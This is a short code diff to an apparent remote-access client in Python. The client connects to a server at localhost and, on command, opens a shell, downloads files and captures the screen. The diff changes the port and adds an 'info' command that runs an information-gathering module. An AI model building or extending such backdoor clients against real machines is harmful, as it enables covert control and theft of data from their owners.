@@ -9,10 +9,11 @@ from clientModule.shell import Shell
 from clientModule.fileOperation import FileOPT
 from clientModule.screen import Screen
 from lib.dsSocket import *
+from clientModule.infoGather import InfoGather
 
 if __name__ == "__main__":
     host = "127.0.0.1"
-    port = 9999
+    port = 1116
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((host, port))
     shell = Shell(client)
@@ -26,6 +27,8 @@ if __name__ == "__main__":
             FileOPT(client, cmd).download()
         elif cmd == "screen":
             Screen(client)
+        elif cmd == "info":
+            InfoGather(client)
         elif cmd in ["quit", "q", "exit"]:
             break
     client.shutdown(2)
